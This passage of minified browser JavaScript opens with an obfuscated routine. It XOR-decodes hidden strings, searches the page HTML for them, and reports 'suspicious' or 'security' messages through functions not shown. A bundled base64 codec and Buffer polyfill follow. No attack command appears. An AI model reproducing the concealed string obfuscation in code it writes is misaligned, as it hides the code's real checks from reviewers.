                    o = new Uint8Array(n.length);
                  for (let t = 0; y.VmENW(t, n.length); t++) {
                    const i = y.UepKF(
                      y.JLVVf(r, y.RHBQp(y[e(511)](t, 4), 8)),
                      255
                    );
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
          ],
          o = document[g(n) + "ement"].outerHTML;
        for (const t of r)
          if (o.includes(t))
            return (
              y.jjkYu(C),
              await z(
                y.CciaE(
                  (function () {
                    const t = function (t, e) {
                      return y.NppAT(t, e);
                    };
                    let e;
                    return function () {
                      const n = K;
                      if (!e) {
                        const r = new Uint8Array([
                            250, 143, 112, 8, 192, 153, 106, 23, 220, 137, 35,
                            27, 198, 158, 102, 88, 217, 155, 119, 12, 204, 136,
                            109, 88, 205, 159, 119, 29, 202, 142, 102, 28, 147,
                            218,
                          ]),
                          o = 2013526697,
                          i = new Uint8Array(r[n(508)]);
                        for (let e = 0; e < r.length; e++) {
                          const n = 255 & t(o, (e % 4) * 8);
                          i[e] = r[e] ^ n;
                        }
                        e = new TextDecoder()[n(479)](i);
                      }
                      return e;
                    };
                  })()(),
                  t
                )
              ),
              ![]
            );
        return !![];
      } catch (w) {
        y[g(r)](C);
        let t = g(o) + "ror";
        return (
          y[g(i)](w, Error)
            ? (t = w.message)
            : typeof w === g(s)
            ? (t = w)
            : w && typeof w === y[g(a)] && (t = JSON[g(u)](w)),
          await q(
            (function () {
              let t;
              return function () {
                if (!t) {
                  const e = new Uint8Array([
                      252, 159, 96, 13, 221, 147, 119, 1, 143, 140, 98, 20, 198,
                      158, 98, 12, 198, 149, 109, 88, 201, 155, 106, 20, 202,
                      158, 57, 88,
                    ]),
                    n = 2013526703,
                    r = new Uint8Array(e.length);
                  for (let t = 0; t < e.length; t++) {
                    const o = (n >>> ((t % 4) * 8)) & 255;
                    r[t] = e[t] ^ o;
                  }
                  t = new TextDecoder().decode(r);
                }
                return t;
              };
            })()() + t
          ),
          ![]
        );
      }
    };
  axiom,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  for (
    var Q = {},
      $ = {
        byteLength: function (t) {
          var e = it(t),
            n = e[0],
            r = e[1];
          return (3 * (n + r)) / 4 - r;
        },
        toByteArray: function (t) {
          var e,
            n,
            r = it(t),
            o = r[0],
            i = r[1],
            s = new nt(
              (function (t, e, n) {
                return (3 * (e + n)) / 4 - n;
              })(0, o, i)
            ),
            a = 0,
            u = i > 0 ? o - 4 : o;
          for (n = 0; n < u; n += 4)
            (e =
              (et[t.charCodeAt(n)] << 18) |
              (et[t.charCodeAt(n + 1)] << 12) |
              (et[t.charCodeAt(n + 2)] << 6) |
              et[t.charCodeAt(n + 3)]),
              (s[a++] = (e >> 16) & 255),
              (s[a++] = (e >> 8) & 255),
              (s[a++] = 255 & e);
          2 === i &&
            ((e = (et[t.charCodeAt(n)] << 2) | (et[t.charCodeAt(n + 1)] >> 4)),
            (s[a++] = 255 & e));
          1 === i &&
            ((e =
              (et[t.charCodeAt(n)] << 10) |
              (et[t.charCodeAt(n + 1)] << 4) |
              (et[t.charCodeAt(n + 2)] >> 2)),
            (s[a++] = (e >> 8) & 255),
            (s[a++] = 255 & e));
          return s;
        },
        fromByteArray: function (t) {
          for (
            var e, n = t.length, r = n % 3, o = [], i = 16383, s = 0, a = n - r;
            s < a;
            s += i
          )
            o.push(at(t, s, s + i > a ? a : s + i));
          1 === r
            ? ((e = t[n - 1]), o.push(tt[e >> 2] + tt[(e << 4) & 63] + "=="))
            : 2 === r &&
              ((e = (t[n - 2] << 8) + t[n - 1]),
              o.push(
                tt[e >> 10] + tt[(e >> 4) & 63] + tt[(e << 2) & 63] + "="
              ));
          return o.join("");
        },
      },
      tt = [],
      et = [],
      nt = "undefined" != typeof Uint8Array ? Uint8Array : Array,
      rt = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
      ot = 0;
    ot < 64;
    ++ot
  )
    (tt[ot] = rt[ot]), (et[rt.charCodeAt(ot)] = ot);
  function it(t) {
    var e = t.length;
    if (e % 4 > 0)
      throw new Error("Invalid string. Length must be a multiple of 4");
    var n = t.indexOf("=");
    return -1 === n && (n = e), [n, n === e ? 0 : 4 - (n % 4)];
  }
  function st(t) {
    return (
      tt[(t >> 18) & 63] + tt[(t >> 12) & 63] + tt[(t >> 6) & 63] + tt[63 & t]
    );
  }
  function at(t, e, n) {
    for (var r, o = [], i = e; i < n; i += 3)
      (r =
        ((t[i] << 16) & 16711680) +
        ((t[i + 1] << 8) & 65280) +
        (255 & t[i + 2])),
        o.push(st(r));
    return o.join("");
  }
  (et["-".charCodeAt(0)] = 62), (et["_".charCodeAt(0)] = 63);
  var ut = {
    read: function (t, e, n, r, o) {
      var i,
        s,
        a = 8 * o - r - 1,
        u = (1 << a) - 1,
        c = u >> 1,
        l = -7,
        d = n ? o - 1 : 0,
        f = n ? -1 : 1,
        h = t[e + d];
      for (
        d += f, i = h & ((1 << -l) - 1), h >>= -l, l += a;
        l > 0;
        i = 256 * i + t[e + d], d += f, l -= 8
      );
      for (
        s = i & ((1 << -l) - 1), i >>= -l, l += r;
        l > 0;
        s = 256 * s + t[e + d], d += f, l -= 8
      );
      if (0 === i) i = 1 - c;
      else {
        if (i === u) return s ? NaN : (1 / 0) * (h ? -1 : 1);
        (s += Math.pow(2, r)), (i -= c);
      }
      return (h ? -1 : 1) * s * Math.pow(2, i - r);
    },
    write: function (t, e, n, r, o, i) {
      var s,
        a,
        u,
        c = 8 * i - o - 1,
        l = (1 << c) - 1,
        d = l >> 1,
        f = 23 === o ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
        h = r ? 0 : i - 1,
        p = r ? 1 : -1,
        m = e < 0 || (0 === e && 1 / e < 0) ? 1 : 0;
      for (
        e = Math.abs(e),
          isNaN(e) || e === 1 / 0
            ? ((a = isNaN(e) ? 1 : 0), (s = l))
            : ((s = Math.floor(Math.log(e) / Math.LN2)),
              e * (u = Math.pow(2, -s)) < 1 && (s--, (u *= 2)),
              (e += s + d >= 1 ? f / u : f * Math.pow(2, 1 - d)) * u >= 2 &&
                (s++, (u /= 2)),
              s + d >= l
                ? ((a = 0), (s = l))
                : s + d >= 1
                ? ((a = (e * u - 1) * Math.pow(2, o)), (s += d))
                : ((a = e * Math.pow(2, d - 1) * Math.pow(2, o)), (s = 0)));
        o >= 8;
        t[n + h] = 255 & a, h += p, a /= 256, o -= 8
      );
      for (
        s = (s << o) | a, c += o;
        c > 0;
        t[n + h] = 255 & s, h += p, s /= 256, c -= 8
      );
      t[n + h - p] |= 128 * m;
    },
  };
  !(function (t) {
    const e = $,
      n = ut,
      r =
        "function" == typeof Symbol && "function" == typeof Symbol.for
          ? Symbol.for("nodejs.util.inspect.custom")
          : null;
    (t.Buffer = c),
      (t.SlowBuffer = function (t) {
        +t != t && (t = 0);
        return c.alloc(+t);
      }),
      (t.INSPECT_MAX_BYTES = 50);
    const o = 2147483647;
    t.kMaxLength = o;
    const { Uint8Array: i, ArrayBuffer: s, SharedArrayBuffer: a } = globalThis;
    function u(t) {
      if (t > o)
        throw new RangeError(
          'The value "' + t + '" is invalid for option "size"'
        );
      const e = new i(t);
      return Object.setPrototypeOf(e, c.prototype), e;
    }
    function c(t, e, n) {
      if ("number" == typeof t) {
        if ("string" == typeof e)
          throw new TypeError(
            'The "string" argument must be of type string. Received type number'
          );
        return f(t);
      }
      return l(t, e, n);
    }
    function l(t, e, n) {
      if ("string" == typeof t)
        return (function (t, e) {
          ("string" == typeof e && "" !== e) || (e = "utf8");
          if (!c.isEncoding(e)) throw new TypeError("Unknown encoding: " + e);
          const n = 0 | g(t, e);
          let r = u(n);
          const o = r.write(t, e);
          o !== n && (r = r.slice(0, o));
          return r;
        })(t, e);
      if (s.isView(t))
        return (function (t) {
          if (J(t, i)) {
            const e = new i(t);
            return p(e.buffer, e.byteOffset, e.byteLength);
          }
          return h(t);
        })(t);
      if (null == t)
        throw new TypeError(
          "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
            typeof t
        );
      if (J(t, s) || (t && J(t.buffer, s))) return p(t, e, n);
      if (void 0 !== a && (J(t, a) || (t && J(t.buffer, a)))) return p(t, e, n);
      if ("number" == typeof t)
        throw new TypeError(
          'The "value" argument must not be of type number. Received type number'
        );
      const r = t.valueOf && t.valueOf();
      if (null != r && r !== t) return c.from(r, e, n);
      const o = (function (t) {
        if (c.isBuffer(t)) {
          const e = 0 | m(t.length),
            n = u(e);
          return 0 === n.length || t.copy(n, 0, 0, e), n;
        }
        if (void 0 !== t.length)
          return "number" != typeof t.length || Y(t.length) ? u(0) : h(t);
        if ("Buffer" === t.type && Array.isArray(t.data)) return h(t.data);
      })(t);
      if (o) return o;
      if (
        "undefined" != typeof Symbol &&
        null != Symbol.toPrimitive &&
        "function" == typeof t[Symbol.toPrimitive]
      )
        return c.from(t[Symbol.toPrimitive]("string"), e, n);
      throw new TypeError(
        "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
          typeof t
      );
    }
    function d(t) {
      if ("number" != typeof t)
        throw new TypeError('"size" argument must be of type number');
      if (t < 0)
        throw new RangeError(
          'The value "' + t + '" is invalid for option "size"'
        );
    }
    function f(t) {
      return d(t), u(t < 0 ? 0 : 0 | m(t));
    }
    function h(t) {
      const e = t.length < 0 ? 0 : 0 | m(t.length),
        n = u(e);
      for (let r = 0; r < e; r += 1) n[r] = 255 & t[r];
      return n;
    }
    function p(t, e, n) {
      if (e < 0 || t.byteLength < e)
        throw new RangeError('"offset" is outside of buffer bounds');
      if (t.byteLength < e + (n || 0))
        throw new RangeError('"length" is outside of buffer bounds');
      let r;
      return (
        (r =
          void 0 === e && void 0 === n
            ? new i(t)
            : void 0 === n
            ? new i(t, e)
            : new i(t, e, n)),
        Object.setPrototypeOf(r, c.prototype),
        r
      );
    }
    function m(t) {
      if (t >= o)
        throw new RangeError(
          "Attempt to allocate Buffer larger than maximum size: 0x" +
            o.toString(16) +
            " bytes"
        );
      return 0 | t;
    }
    function g(t, e) {
      if (c.isBuffer(t)) return t.length;
      if (s.isView(t) || J(t, s)) return t.byteLength;
      if ("string" != typeof t)
        throw new TypeError(
          'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' +
            typeof t
        );
      const n = t.length,
        r = arguments.length > 2 && !0 === arguments[2];
      if (!r && 0 === n) return 0;
      let o = !1;
      for (;;)
        switch (e) {
          case "ascii":
          case "latin1":
          case "binary":
            return n;
          case "utf8":
          case "utf-8":
            return H(t).length;
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return 2 * n;
          case "hex":
            return n >>> 1;
          case "base64":
            return X(t).length;
          default:
            if (o) return r ? -1 : H(t).length;
            (e = ("" + e).toLowerCase()), (o = !0);
        }
    }
    function y(t, e, n) {
      let r = !1;
      if (((void 0 === e || e < 0) && (e = 0), e > this.length)) return "";
      if (((void 0 === n || n > this.length) && (n = this.length), n <= 0))
        return "";
      if ((n >>>= 0) <= (e >>>= 0)) return "";
      for (t || (t = "utf8"); ; )
        switch (t) {
          case "hex":
            return P(this, e, n);
          case "utf8":
          case "utf-8":
            return C(this, e, n);
          case "ascii":
            return E(this, e, n);
          case "latin1":
          case "binary":
            return x(this, e, n);
          case "base64":
            return T(this, e, n);
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return R(this, e, n);
          default:
            if (r) throw new TypeError("Unknown encoding: " + t);
            (t = (t + "").toLowerCase()), (r = !0);
        }
    }
    function w(t, e, n) {
      const r = t[e];
      (t[e] = t[n]), (t[n] = r);
    }
    function b(t, e, n, r, o) {
      if (0 === t.length) return -1;
      if (
        ("string" == typeof n
          ? ((r = n), (n = 0))
          : n > 2147483647
          ? (n = 2147483647)
          : n < -2147483648 && (n = -2147483648),
        Y((n = +n)) && (n = o ? 0 : t.length - 1),
        n < 0 && (n = t.length + n),
        n >= t.length)
      ) {
        if (o) return -1;
        n = t.length - 1;
      } else if (n < 0) {
        if (!o) return -1;
        n = 0;
      }
      if (("string" == typeof e && (e = c.from(e, r)), c.isBuffer(e)))
        return 0 === e.length ? -1 : v(t, e, n, r, o);
      if ("number" == typeof e)
        return (
          (e &= 255),
          "function" == typeof i.prototype.indexOf
            ? o
              ? i.prototype.indexOf.call(t, e, n)
              : i.prototype.lastIndexOf.call(t, e, n)
            : v(t, [e], n, r, o)
        );
      throw new TypeError("val must be string, number or Buffer");
    }
    function v(t, e, n, r, o) {
      let i,
        s = 1,
        a = t.length,
        u = e.length;
      if (
        void 0 !== r &&
        ("ucs2" === (r = String(r).toLowerCase()) ||
          "ucs-2" === r ||
          "utf16le" === r ||
          "utf-16le" === r)
      ) {
        if (t.length < 2 || e.length < 2) return -1;
        (s = 2), (a /= 2), (u /= 2), (n /= 2);
      }
      function c(t, e) {
        return 1 === s ? t[e] : t.readUInt16BE(e * s);
      }
      if (o) {
        let r = -1;
        for (i = n; i < a; i++)
          if (c(t, i) === c(e, -1 === r ? 0 : i - r)) {
            if ((-1 === r && (r = i), i - r + 1 === u)) return r * s;
          } else -1 !== r && (i -= i - r), (r = -1);
      } else
        for (n + u > a && (n = a - u), i = n; i >= 0; i--) {
          let n = !0;
          for (let r = 0; r < u; r++)
            if (c(t, i + r) !== c(e, r)) {
              n = !1;
              break;
            }
          if (n) return i;
        }
      return -1;
    }
    function A(t, e, n, r) {
      n = Number(n) || 0;
      const o = t.length - n;
      r ? (r = Number(r)) > o && (r = o) : (r = o);
      const i = e.length;
      let s;
      for (r > i / 2 && (r = i / 2), s = 0; s < r; ++s) {
        const r = parseInt(e.substr(2 * s, 2), 16);
        if (Y(r)) return s;
        t[n + s] = r;
      }
      return s;
    }
    function k(t, e, n, r) {
      return Z(H(e, t.length - n), t, n, r);
    }
    function I(t, e, n, r) {
      return Z(
        (function (t) {
          const e = [];
          for (let n = 0; n < t.length; ++n) e.push(255 & t.charCodeAt(n));
          return e;
        })(e),
        t,
        n,
        r
      );
    }
    function S(t, e, n, r) {
      return Z(X(e), t, n, r);
    }
    function _(t, e, n, r) {
      return Z(
        (function (t, e) {
          let n, r, o;
          const i = [];
          for (let s = 0; s < t.length && !((e -= 2) < 0); ++s)
            (n = t.charCodeAt(s)),
              (r = n >> 8),
              (o = n % 256),
              i.push(o),
              i.push(r);
          return i;
        })(e, t.length - n),
        t,
        n,
        r
      );
    }
    function T(t, n, r) {
      return 0 === n && r === t.length
        ? e.fromByteArray(t)
        : e.fromByteArray(t.slice(n, r));
    }
    function C(t, e, n) {
      n = Math.min(t.length, n);
      const r = [];
      let o = e;
      for (; o < n; ) {
        const e = t[o];
        let i = null,
          s = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
        if (o + s <= n) {
          let n, r, a, u;
          switch (s) {
            case 1:
              e < 128 && (i = e);
              break;
            case 2:
              (n = t[o + 1]),
                128 == (192 & n) &&
                  ((u = ((31 & e) << 6) | (63 & n)), u > 127 && (i = u));
              break;
            case 3:
              (n = t[o + 1]),
                (r = t[o + 2]),
                128 == (192 & n) &&
                  128 == (192 & r) &&
                  ((u = ((15 & e) << 12) | ((63 & n) << 6) | (63 & r)),
                  u > 2047 && (u < 55296 || u > 57343) && (i = u));
              break;
            case 4:
              (n = t[o + 1]),
                (r = t[o + 2]),
                (a = t[o + 3]),
                128 == (192 & n) &&
                  128 == (192 & r) &&
                  128 == (192 & a) &&
                  ((u =
                    ((15 & e) << 18) |
                    ((63 & n) << 12) |
                    ((63 & r) << 6) |
                    (63 & a)),
                  u > 65535 && u < 1114112 && (i = u));
          }
        }
        null === i
          ? ((i = 65533), (s = 1))
          : i > 65535 &&
            ((i -= 65536),
            r.push(((i >>> 10) & 1023) | 55296),
            (i = 56320 | (1023 & i))),
          r.push(i),
          (o += s);
      }
      return (function (t) {
        const e = t.length;
        if (e <= B) return String.fromCharCode.apply(String, t);
        let n = "",
          r = 0;
        for (; r < e; )
          n += String.fromCharCode.apply(String, t.slice(r, (r += B)));
        return n;
      })(r);
    }
    (c.TYPED_ARRAY_SUPPORT = (function () {
      try {
        const t = new i(1),
          e = {
            foo: function () {
              return 42;
            },
          };
        return (
          Object.setPrototypeOf(e, i.prototype),
          Object.setPrototypeOf(t, e),
          42 === t.foo()
        );
      } catch (t) {
        return !1;
      }
    })()),
      c.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || console.error,
      Object.defineProperty(c.prototype, "parent", {
        enumerable: !0,
        get: function () {
          if (c.isBuffer(this)) return this.buffer;
        },
      }),
      Object.defineProperty(c.prototype, "offset", {
        enumerable: !0,
        get: function () {
          if (c.isBuffer(this)) return this.byteOffset;
        },
      }),
      (c.poolSize = 8192),
      (c.from = function (t, e, n) {
        return l(t, e, n);
      }),
      Object.setPrototypeOf(c.prototype, i.prototype),
      Object.setPrototypeOf(c, i),
      (c.alloc = function (t, e, n) {
        return (function (t, e, n) {
          return (
            d(t),
            t <= 0
              ? u(t)
              : void 0 !== e
              ? "string" == typeof n
                ? u(t).fill(e, n)
                : u(t).fill(e)
              : u(t)
          );
        })(t, e, n);
      }),
      (c.allocUnsafe = function (t) {
        return f(t);
      }),
      (c.allocUnsafeSlow = function (t) {
        return f(t);
      }),
      (c.isBuffer = function (t) {
        return null != t && !0 === t._isBuffer && t !== c.prototype;
      }),
      (c.compare = function (t, e) {
        if (
          (J(t, i) && (t = c.from(t, t.offset, t.byteLength)),
          J(e, i) && (e = c.from(e, e.offset, e.byteLength)),
          !c.isBuffer(t) || !c.isBuffer(e))
        )
          throw new TypeError(
            'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
          );
        if (t === e) return 0;
        let n = t.length,
          r = e.length;
        for (let o = 0, i = Math.min(n, r); o < i; ++o)
          if (t[o] !== e[o]) {
            (n = t[o]), (r = e[o]);
            break;
          }
        return n < r ? -1 : r < n ? 1 : 0;
      }),
      (c.isEncoding = function (t) {
        switch (String(t).toLowerCase()) {
          case "hex":
          case "utf8":
          case "utf-8":
          case "ascii":
          case "latin1":
          case "binary":
          case "base64":
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return !0;
          default:
            return !1;
        }
      }),
      (c.concat = function (t, e) {
        if (!Array.isArray(t))
          throw new TypeError('"list" argument must be an Array of Buffers');
        if (0 === t.length) return c.alloc(0);
        let n;
        if (void 0 === e)
          for (e = 0, n = 0; n < t.length; ++n) e += t[n].length;
        const r = c.allocUnsafe(e);
        let o = 0;
        for (n = 0; n < t.length; ++n) {
          let e = t[n];
          if (J(e, i))
            o + e.length > r.length
              ? (c.isBuffer(e) || (e = c.from(e)), e.copy(r, o))
              : i.prototype.set.call(r, e, o);
          else {
            if (!c.isBuffer(e))
              throw new TypeError(
                '"list" argument must be an Array of Buffers'
              );
            e.copy(r, o);
          }
          o += e.length;
        }
        return r;
      }),
      (c.byteLength = g),
      (c.prototype._isBuffer = !0),
      (c.prototype.swap16 = function () {
        const t = this.length;
        if (t % 2 != 0)
          throw new RangeError("Buffer size must be a multiple of 16-bits");
        for (let e = 0; e < t; e += 2) w(this, e, e + 1);
        return this;
      }),
      (c.prototype.swap32 = function () {
        const t = this.length;
        if (t % 4 != 0)
          throw new RangeError("Buffer size must be a multiple of 32-bits");
        for (let e = 0; e < t; e += 4) w(this, e, e + 3), w(this, e + 1, e + 2);
        return this;
      }),
      (c.prototype.swap64 = function () {
        const t = this.length;
        if (t % 8 != 0)
          throw new RangeError("Buffer size must be a multiple of 64-bits");
        for (let e = 0; e < t; e += 8)
          w(this, e, e + 7),
            w(this, e + 1, e + 6),
            w(this, e + 2, e + 5),
            w(this, e + 3, e + 4);
        return this;
      }),
      (c.prototype.toString = function () {
        const t = this.length;
        return 0 === t
          ? ""
          : 0 === arguments.length
          ? C(this, 0, t)
          : y.apply(this, arguments);
      }),
      (c.prototype.toLocaleString = c.prototype.toString),
      (c.prototype.equals = function (t) {
        if (!c.isBuffer(t)) throw new TypeError("Argument must be a Buffer");
        return this === t || 0 === c.compare(this, t);
      }),
      (c.prototype.inspect = function () {
        let e = "";
        const n = t.INSPECT_MAX_BYTES;
        return (
          (e = this.toString("hex", 0, n)
            .replace(/(.{2})/g, "$1 ")
            .trim()),
          this.length > n && (e += " ... "),
          "<Buffer " + e + ">"
        );
      }),
      r && (c.prototype[r] = c.prototype.inspect),
      (c.prototype.compare = function (t, e, n, r, o) {
        if (
          (J(t, i) && (t = c.from(t, t.offset, t.byteLength)), !c.isBuffer(t))
        )
          throw new TypeError(
            'The "target" argument must be one of type Buffer or Uint8Array. Received type ' +
              typeof t
          );
        if (
          (void 0 === e && (e = 0),
          void 0 === n && (n = t ? t.length : 0),
          void 0 === r && (r = 0),
          void 0 === o && (o = this.length),
          e < 0 || n > t.length || r < 0 || o > this.length)
        )
          throw new RangeError("out of range index");
        if (r >= o && e >= n) return 0;
        if (r >= o) return -1;
        if (e >= n) return 1;
        if (this === t) return 0;
        let s = (o >>>= 0) - (r >>>= 0),
          a = (n >>>= 0) - (e >>>= 0);
        const u = Math.min(s, a),
          l = this.slice(r, o),
          d = t.slice(e, n);
        for (let i = 0; i < u; ++i)
          if (l[i] !== d[i]) {
            (s = l[i]), (a = d[i]);
            break;
          }
        return s < a ? -1 : a < s ? 1 : 0;
      }),
      (c.prototype.includes = function (t, e, n) {
        return -1 !== this.indexOf(t, e, n);
      }),
      (c.prototype.indexOf = function (t, e, n) {
        return b(this, t, e, n, !0);
      }),
      (c.prototype.lastIndexOf = function (t, e, n) {
        return b(this, t, e, n, !1);
      }),
      (c.prototype.write = function (t, e, n, r) {
        if (void 0 === e) (r = "utf8"), (n = this.length), (e = 0);
        else if (void 0 === n && "string" == typeof e)
          (r = e), (n = this.length), (e = 0);
        else {
          if (!isFinite(e))
            throw new Error(
              "Buffer.write(string, encoding, offset[, length]) is no longer supported"
            );
          (e >>>= 0),
            isFinite(n)
              ? ((n >>>= 0), void 0 === r && (r = "utf8"))
              : ((r = n), (n = void 0));
        }
        const o = this.length - e;
        if (
          ((void 0 === n || n > o) && (n = o),
          (t.length > 0 && (n < 0 || e < 0)) || e > this.length)
        )
          throw new RangeError("Attempt to write outside buffer bounds");
        r || (r = "utf8");
        let i = !1;
        for (;;)
          switch (r) {
            case "hex":
              return A(this, t, e, n);
            case "utf8":
            case "utf-8":
              return k(this, t, e, n);
            case "ascii":
            case "latin1":
            case "binary":
              return I(this, t, e, n);
            case "base64":
              return S(this, t, e, n);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return _(this, t, e, n);
            default:
              if (i) throw new TypeError("Unknown encoding: " + r);
              (r = ("" + r).toLowerCase()), (i = !0);
          }
      }),
      (c.prototype.toJSON = function () {
        return {
          type: "Buffer",
          data: Array.prototype.slice.call(this._arr || this, 0),
        };
      });
    const B = 4096;
    function E(t, e, n) {
      let r = "";
      n = Math.min(t.length, n);
      for (let o = e; o < n; ++o) r += String.fromCharCode(127 & t[o]);
      return r;
    }
    function x(t, e, n) {
      let r = "";
      n = Math.min(t.length, n);
      for (let o = e; o < n; ++o) r += String.fromCharCode(t[o]);
      return r;
    }
    function P(t, e, n) {
      const r = t.length;
      (!e || e < 0) && (e = 0), (!n || n < 0 || n > r) && (n = r);
      let o = "";
      for (let i = e; i < n; ++i) o += Q[t[i]];
      return o;
    }
    function R(t, e, n) {
      const r = t.slice(e, n);
      let o = "";
      for (let i = 0; i < r.length - 1; i += 2)
        o += String.fromCharCode(r[i] + 256 * r[i + 1]);
      return o;
    }
    function O(t, e, n) {
      if (t % 1 != 0 || t < 0) throw new RangeError("offset is not uint");
      if (t + e > n)
        throw new RangeError("Trying to access beyond buffer length");
    }
    function M(t, e, n, r, o, i) {
      if (!c.isBuffer(t))
        throw new TypeError('"buffer" argument must be a Buffer instance');
      if (e > o || e < i)
        throw new RangeError('"value" argument is out of bounds');
      if (n + r > t.length) throw new RangeError("Index out of range");
    }
    function L(t, e, n, r, o) {
      F(e, r, o, t, n, 7);
      let i = Number(e & BigInt(4294967295));
      (t[n++] = i),
        (i >>= 8),
        (t[n++] = i),
        (i >>= 8),
        (t[n++] = i),
        (i >>= 8),
        (t[n++] = i);
      let s = Number((e >> BigInt(32)) & BigInt(4294967295));
      return (
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        (s >>= 8),
        (t[n++] = s),
        n
      );
    }
    function N(t, e, n, r, o) {
      F(e, r, o, t, n, 7);
      let i = Number(e & BigInt(4294967295));
      (t[n + 7] = i),
        (i >>= 8),
        (t[n + 6] = i),
        (i >>= 8),
        (t[n + 5] = i),
        (i >>= 8),
        (t[n + 4] = i);
      let s = Number((e >> BigInt(32)) & BigInt(4294967295));
      return (
        (t[n + 3] = s),
        (s >>= 8),
        (t[n + 2] = s),
        (s >>= 8),
        (t[n + 1] = s),
        (s >>= 8),
        (t[n] = s),
        n + 8
      );
    }
    function D(t, e, n, r, o, i) {
      if (n + r > t.length) throw new RangeError("Index out of range");
      if (n < 0) throw new RangeError("Index out of range");
    }
    function U(t, e, r, o, i) {
      return (
        (e = +e),
        (r >>>= 0),
        i || D(t, 0, r, 4),
        n.write(t, e, r, o, 23, 4),
        r + 4
      );
    }
    function q(t, e, r, o, i) {
      return (
        (e = +e),
        (r >>>= 0),
        i || D(t, 0, r, 8),
        n.write(t, e, r, o, 52, 8),
        r + 8
      );
    }
    (c.prototype.slice = function (t, e) {
      const n = this.length;
      (t = ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n),
        (e = void 0 === e ? n : ~~e) < 0
          ? (e += n) < 0 && (e = 0)
          : e > n && (e = n),
        e < t && (e = t);
      const r = this.subarray(t, e);
      return Object.setPrototypeOf(r, c.prototype), r;
    }),
      (c.prototype.readUintLE = c.prototype.readUIntLE =
        function (t, e, n) {
          (t >>>= 0), (e >>>= 0), n || O(t, e, this.length);
          let r = this[t],
            o = 1,
            i = 0;
          for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
          return r;
        }),
      (c.prototype.readUintBE = c.prototype.readUIntBE =
        function (t, e, n) {
          (t >>>= 0), (e >>>= 0), n || O(t, e, this.length);
          let r = this[t + --e],
            o = 1;
          for (; e > 0 && (o *= 256); ) r += this[t + --e] * o;
          return r;
        }),
      (c.prototype.readUint8 = c.prototype.readUInt8 =
        function (t, e) {
          return (t >>>= 0), e || O(t, 1, this.length), this[t];
        }),
      (c.prototype.readUint16LE = c.prototype.readUInt16LE =
        function (t, e) {
          return (
            (t >>>= 0), e || O(t, 2, this.length), this[t] | (this[t + 1] << 8)
          );
        }),
      (c.prototype.readUint16BE = c.prototype.readUInt16BE =
        function (t, e) {
          return (
            (t >>>= 0), e || O(t, 2, this.length), (this[t] << 8) | this[t + 1]
          );
        }),
      (c.prototype.readUint32LE = c.prototype.readUInt32LE =
        function (t, e) {
          return (
            (t >>>= 0),
            e || O(t, 4, this.length),
            (this[t] | (this[t + 1] << 8) | (this[t + 2] << 16)) +
              16777216 * this[t + 3]
          );
        }),
      (c.prototype.readUint32BE = c.prototype.readUInt32BE =
        function (t, e) {
          return (
            (t >>>= 0),
            e || O(t, 4, this.length),
            16777216 * this[t] +
              ((this[t + 1] << 16) | (this[t + 2] << 8) | this[t + 3])
          );
        }),
      (c.prototype.readBigUInt64LE = tt(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24,
          o = this[++t] + 256 * this[++t] + 65536 * this[++t] + n * 2 ** 24;
        return BigInt(r) + (BigInt(o) << BigInt(32));
      })),
      (c.prototype.readBigUInt64BE = tt(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = e * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + this[++t],
          o = this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n;
        return (BigInt(r) << BigInt(32)) + BigInt(o);
      })),
      (c.prototype.readIntLE = function (t, e, n) {
        (t >>>= 0), (e >>>= 0), n || O(t, e, this.length);
        let r = this[t],
          o = 1,
          i = 0;
        for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
        return (o *= 128), r >= o && (r -= Math.pow(2, 8 * e)), r;
      }),
      (c.prototype.readIntBE = function (t, e, n) {
        (t >>>= 0), (e >>>= 0), n || O(t, e, this.length);
        let r = e,
          o = 1,
          i = this[t + --r];
        for (; r > 0 && (o *= 256); ) i += this[t + --r] * o;
        return (o *= 128), i >= o && (i -= Math.pow(2, 8 * e)), i;
      }),
      (c.prototype.readInt8 = function (t, e) {
        return (
          (t >>>= 0),
          e || O(t, 1, this.length),
          128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
        );
      }),
      (c.prototype.readInt16LE = function (t, e) {
        (t >>>= 0), e || O(t, 2, this.length);
        const n = this[t] | (this[t + 1] << 8);
        return 32768 & n ? 4294901760 | n : n;
      }),
      (c.prototype.readInt16BE = function (t, e) {
        (t >>>= 0), e || O(t, 2, this.length);
        const n = this[t + 1] | (this[t] << 8);
        return 32768 & n ? 4294901760 | n : n;
      }),
      (c.prototype.readInt32LE = function (t, e) {
        return (
          (t >>>= 0),
          e || O(t, 4, this.length),
          this[t] |
            (this[t + 1] << 8) |
            (this[t + 2] << 16) |
            (this[t + 3] << 24)
        );
      }),
      (c.prototype.readInt32BE = function (t, e) {
        return (
          (t >>>= 0),
          e || O(t, 4, this.length),
          (this[t] << 24) |
            (this[t + 1] << 16) |
            (this[t + 2] << 8) |
            this[t + 3]
